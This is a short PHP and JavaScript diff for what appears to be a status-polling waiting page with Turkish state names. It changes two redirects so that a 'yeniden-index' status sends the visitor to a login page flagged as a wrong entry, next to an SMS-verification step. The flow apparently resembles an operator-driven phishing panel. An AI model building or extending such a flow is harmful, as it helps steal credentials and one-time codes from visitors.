@@ -12,7 +12,7 @@ if ($application === null) {
 }
 
 if ((string) ($application['status'] ?? '') === 'yeniden-index') {
-    header('Location: index.php');
+    header('Location: giris.php?error=hatali');
     exit;
 }
 upsertPresence('waiting', (string) $application['id'], false);
@@ -118,7 +118,7 @@ if ($status === 'tebrikler') {
         if (!data.ok) return;
 
         if (data.status === 'yeniden-index') {
-          window.location.href = 'index.php';
+          window.location.href = 'giris.php?error=hatali';
           return;
         }
         if (data.status === 'sms-dogrulama') {
